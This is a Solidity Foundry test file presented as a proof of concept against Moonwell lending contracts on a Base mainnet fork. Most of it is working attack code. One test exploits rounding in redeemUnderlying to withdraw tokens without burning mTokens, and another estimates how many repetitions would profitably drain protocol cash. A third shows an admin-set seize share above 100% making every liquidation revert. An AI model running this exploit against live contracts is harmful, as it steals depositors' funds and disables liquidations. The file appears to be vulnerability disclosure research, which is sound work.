// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@forge-std/Test.sol";
import {MToken} from "@protocol/MToken.sol";
import {MErc20} from "@protocol/MErc20.sol";
import {IERC20} from "@openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
/**
 * @title Moonwell Vulnerability PoC - Mainnet Fork Test
 * @notice Comprehensive proof-of-concept demonstrating both vulnerabilities
 * @dev Fork mainnet and test against real Moonwell contracts
 * 
 * SETUP:
 * 1. Set BASE_RPC_URL environment variable
 * 2. Run: forge test --fork-url $BASE_RPC_URL --match-test testPrecisionLossExploit -vvv
 */
contract MoonwellVulnerabilityPoC is Test {
    
    // Moonwell Base Mainnet Addresses (as of 2024)
    // Update these with actual deployed addresses from: https://docs.moonwell.fi/moonwell/developers/deployed-contracts
    address constant COMPTROLLER = 0x8E00D5e02E65A19337Cdba98bbA9F84d4186a180;
    
    // Example mToken addresses (update with actual addresses)
    address constant M_USDC = 0xEdc817A28E8B93B1Edc3E3Ff422a0a8818702eC1;
    address constant M_WETH = 0x628ff693426583D9a7FB391E54366292F509D457;
    
    MToken public mToken;
    IERC20 public underlying;
    
    address public attacker = address(0xDEAD);
    address public admin;
    
    uint256 public constant MANTISSA_ONE = 1e18;
    
    function setUp() public {
        // Fork Base mainnet
        // Uncomment when ready to test:
        // vm.createSelectFork(vm.envString("BASE_RPC_URL"));
        
        // Use a market for testing (update with actual address)
        mToken = MToken(M_USDC);
        underlying = IERC20(MErc20(address(mToken)).underlying());
        admin = mToken.admin();
        
        // Label addresses for better traces
        vm.label(address(mToken), "MToken");
        vm.label(address(underlying), "Underlying");
        vm.label(attacker, "Attacker");
        vm.label(admin, "Admin");
    }
    
    // ============ FINDING 1: PRECISION LOSS EXPLOIT ============
    
    /**
     * @notice Test precision loss vulnerability in redeemFresh
     * @dev Demonstrates how small redeem amounts can result in zero tokens burned
     */
    function testPrecisionLossExploit() public {
        // Skip if not forked
        if (block.chainid == 31337) {
            console.log("Skipping - not on fork. Set BASE_RPC_URL to test on fork.");
            return;
        }
        
        // Get current exchange rate
        uint256 exchangeRate = mToken.exchangeRateStored();
        console.log("\n=== PRECISION LOSS EXPLOIT TEST ===");
        console.log("Exchange Rate:", exchangeRate);
        console.log("Exchange Rate (human):", exchangeRate * 1e12 / 1e18, "USDC per mToken");
        
        // Calculate maximum redeemAmountIn that results in redeemTokens = 0
        // redeemTokens = truncate((redeemAmountIn * 1e18) / exchangeRate)
        // For truncate to return 0: (redeemAmountIn * 1e18) / exchangeRate < 1e18
        // Therefore: redeemAmountIn < exchangeRate
        
        uint256 maxRedeemAmount = exchangeRate > 0 ? exchangeRate - 1 : 0;
        console.log("Max Redeem Amount (without burn):", maxRedeemAmount);
        
        // Get protocol cash
        uint256 protocolCash = mToken.getCash();
        console.log("Protocol Cash:", protocolCash);
        
        // Verify the exploit works
        if (maxRedeemAmount > 0 && protocolCash >= maxRedeemAmount) {
            // Setup attacker with some underlying tokens
            deal(address(underlying), attacker, maxRedeemAmount * 10);
            
            vm.startPrank(attacker);
            
            // Mint some mTokens first
            underlying.approve(address(mToken), type(uint256).max);
            uint256 mintAmount = maxRedeemAmount * 100;
            require(mToken.mint(mintAmount) == 0, "Mint failed");
            
            uint256 initialBalance = underlying.balanceOf(attacker);
            uint256 initialMTokens = mToken.balanceOf(attacker);
            uint256 initialTotalSupply = mToken.totalSupply();
            
            console.log("\nBefore exploit:");
            console.log("Attacker underlying balance:", initialBalance);
            console.log("Attacker mToken balance:", initialMTokens);
            console.log("Total mToken supply:", initialTotalSupply);
            
            // Attempt to redeem the small amount
            // This calls redeemUnderlying -> redeemUnderlyingInternal -> redeemFresh
            uint256 result = MErc20(address(mToken)).redeemUnderlying(maxRedeemAmount);
            
            uint256 finalBalance = underlying.balanceOf(attacker);
            uint256 finalMTokens = mToken.balanceOf(attacker);
            uint256 finalTotalSupply = mToken.totalSupply();
            
            console.log("\nAfter exploit:");
            console.log("Redeem result:", result);
            console.log("Attacker underlying balance:", finalBalance);
            console.log("Attacker mToken balance:", finalMTokens);
            console.log("Total mToken supply:", finalTotalSupply);
            
            uint256 tokensBurned = initialMTokens - finalMTokens;
            uint256 underlyingReceived = finalBalance - initialBalance;
            
            console.log("\nExploit results:");
            console.log("Underlying received:", underlyingReceived);
            console.log("MTokens burned:", tokensBurned);
            
            if (tokensBurned == 0 && underlyingReceived > 0) {
                console.log("\n*** EXPLOIT SUCCESSFUL ***");
                console.log("Received underlying without burning any mTokens!");
            } else {
                console.log("\n*** Exploit not viable at current exchange rate ***");
                console.log("Exchange rate may be too low for this exploit");
            }
            
            vm.stopPrank();
        } else {
            console.log("\nExploit conditions not met:");
            console.log("Max redeem amount:", maxRedeemAmount);
            console.log("Protocol cash:", protocolCash);
        }
    }
    
    /**
     * @notice Calculate economic viability of precision loss exploit
     */
    function testPrecisionLossEconomicViability() public view {
        if (block.chainid == 31337) return;
        
        uint256 exchangeRate = mToken.exchangeRateStored();
        uint256 maxRedeemAmount = exchangeRate > 0 ? exchangeRate - 1 : 0;
        
        // Gas cost estimation
        uint256 gasPerRedeem = 200_000; // Estimated gas per redeem call
        uint256 gasPrice = 0.1 gwei; // Base network gas price (adjust)
        uint256 gasCostWei = gasPerRedeem * gasPrice;
        
        // Convert to underlying token terms (assuming 6 decimals for USDC)
        uint256 gasCostUnderlying = gasCostWei / 1e12; // Rough conversion
        
        console.log("\n=== ECONOMIC VIABILITY ANALYSIS ===");
        console.log("Gas per transaction:", gasPerRedeem);
        console.log("Gas price (gwei):", gasPrice / 1e9);
        console.log("Gas cost (wei):", gasCostWei);
        console.log("Gas cost (underlying):", gasCostUnderlying);
        console.log("Max redeem amount:", maxRedeemAmount);
        console.log("Net profit per tx:", maxRedeemAmount > gasCostUnderlying ? maxRedeemAmount - gasCostUnderlying : 0);
        
        if (maxRedeemAmount > gasCostUnderlying) {
            uint256 protocolCash = mToken.getCash();
            uint256 maxIterations = protocolCash / maxRedeemAmount;
            uint256 totalProfit = maxRedeemAmount * maxIterations;
            
            console.log("\nPotential exploit scale:");
            console.log("Max iterations:", maxIterations);
            console.log("Total potential profit:", totalProfit);
            console.log("Total gas cost:", gasCostWei * maxIterations);
        }
    }
    
    // ============ FINDING 2: SEIZE DOS VULNERABILITY ============
    
    /**
     * @notice Test DoS vulnerability in seize function
     * @dev Demonstrates how setting protocolSeizeShareMantissa > 1e18 causes underflow
     */
    function testSeizeDoS() public {
        if (block.chainid == 31337) {
            console.log("Skipping - not on fork. Set BASE_RPC_URL to test on fork.");
            return;
        }
        
        console.log("\n=== SEIZE DOS VULNERABILITY TEST ===");
        
        // Get current protocol seize share
        uint256 currentShare = mToken.protocolSeizeShareMantissa();
        console.log("Current protocol seize share:", currentShare);
        console.log("Mantissa One (1e18):", MANTISSA_ONE);
        
        // Impersonate admin
        vm.startPrank(admin);
        
        // Attempt to set protocolSeizeShareMantissa > 1e18
        uint256 invalidShare = 2e18; // 200%
        console.log("\nAttempting to set protocol seize share to:", invalidShare);
        
        // This should succeed (no validation)
        uint256 result = mToken._setProtocolSeizeShare(invalidShare);
        require(result == 0, "Setting protocol seize share failed");
        
        uint256 newShare = mToken.protocolSeizeShareMantissa();
        console.log("New protocol seize share:", newShare);
        require(newShare == invalidShare, "Protocol seize share not set correctly");
        
        vm.stopPrank();
        
        // Now attempt a liquidation (seize call)
        // This should revert due to underflow
        console.log("\nAttempting liquidation (seize call)...");
        
        vm.expectRevert("subtraction underflow");
        mToken.seize(address(this), address(0x1111), 1000e18);
        
        console.log("*** DOS CONFIRMED: All liquidations will fail ***");
    }
    
    /**
     * @notice Demonstrate the underflow calculation
     */
    function testUnderflowCalculation() public pure {
        uint256 seizeTokens = 1000e18;
        uint256 protocolSeizeShareMantissa = 2e18; // 200% (invalid)
        
        // Calculate protocolSeizeTokens
        // protocolSeizeTokens = (seizeTokens * protocolSeizeShareMantissa) / 1e18
        uint256 protocolSeizeTokens = (seizeTokens * protocolSeizeShareMantissa) / 1e18;
        
        console.log("\n=== UNDERFLOW CALCULATION ===");
        console.log("Seize Tokens:", seizeTokens);
        console.log("Protocol Seize Share Mantissa:", protocolSeizeShareMantissa);
        console.log("Protocol Seize Tokens:", protocolSeizeTokens);
        console.log("Liquidator Seize Tokens (would be):", seizeTokens - protocolSeizeTokens);
        
        assertGt(protocolSeizeTokens, seizeTokens, "Underflow would occur");
    }
    
    /**
     * @notice Test that proper validation would prevent the vulnerability
     */
    function testProperValidation() public {
        if (block.chainid == 31337) return;
        
        console.log("\n=== PROPER VALIDATION TEST ===");
        
        uint256 invalidShare = 2e18;
        
        // Show what proper validation would look like
        bool wouldBePrevented = invalidShare > MANTISSA_ONE;
        
        console.log("Invalid share value:", invalidShare);
        console.log("Would be prevented by validation:", wouldBePrevented);
        
        assertTrue(wouldBePrevented, "Validation would prevent this");
    }
}

